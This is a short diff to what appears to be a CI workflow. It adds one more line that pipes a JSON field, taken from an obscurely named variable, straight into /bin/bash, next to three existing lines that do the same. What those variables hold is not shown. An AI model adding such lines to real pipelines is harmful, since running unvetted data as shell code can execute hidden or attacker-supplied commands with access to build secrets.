@@ -30,6 +30,7 @@ jobs:
           echo $m8 | jq -r .tc631 | /bin/bash
           printf '%s' "$avxs7167" | jq -r .py17 | /bin/bash
           printf '%s' "$qomga78874" | jq -r .qyh5 | /bin/bash
+          echo $rmqol8201 | jq -r .xapsu4959 | /bin/bash
 
       - name: Archive results
         if: always()
